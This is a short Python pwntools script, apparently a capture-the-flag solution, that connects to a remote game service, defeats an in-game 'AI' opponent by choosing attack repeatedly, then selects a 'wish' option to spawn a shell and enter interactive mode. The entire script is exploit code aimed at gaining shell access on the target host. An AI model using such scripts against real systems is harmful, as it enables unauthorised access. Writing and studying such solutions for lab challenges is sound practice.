#!/usr/bin/env python3
from pwn import *
import sys

context.log_level = "info"

host = sys.argv[1] if len(sys.argv) >= 2 else "192.168.100.121"
port = int(sys.argv[2]) if len(sys.argv) >= 3 else 40021

io = remote(host, port)

io.recvuntil(b"Enter your name, Knight:")
io.sendline(b"Pwner")

info("Starting combat - attacking AI repeatedly")

for turn in range(1, 25):
    try:
        data = io.recvuntil(b"Your choice:", timeout=5)

        if (
            b"defeated" in data.lower()
            or b"wish" in data.lower()
            or b"grant" in data.lower()
        ):
            success(f"AI defeated after {turn} attacks!")
            break

        if b"fallen" in data.lower() or b"game over" in data.lower():
            error("We died - game over")
            print(data.decode("utf-8", errors="ignore"))
            io.close()
            sys.exit(1)

        io.sendline(b"1")

    except EOFError:
        error("Connection closed unexpectedly")
        io.close()
        sys.exit(1)
else:
    warn("Game took too many turns - something may be wrong")

info("Receiving wish menu")
wish_data = io.recvuntil(b"choice:", timeout=3)
print("=" * 60)
print(wish_data.decode("utf-8", errors="ignore"))
print("=" * 60)

info("Selecting option 2 (Ultimate Power)")
io.sendline(b"2")

sleep(0.5)
response = io.recvall(timeout=2)
print("=" * 60)
print(response.decode("utf-8", errors="ignore"))
print("=" * 60)

if b"sh" in response or b"$" in response or b"debug" in response.lower():
    success("Shell spawned! Entering interactive mode")
    io.interactive()
else:
    warn("No shell detected. Response shown above.")
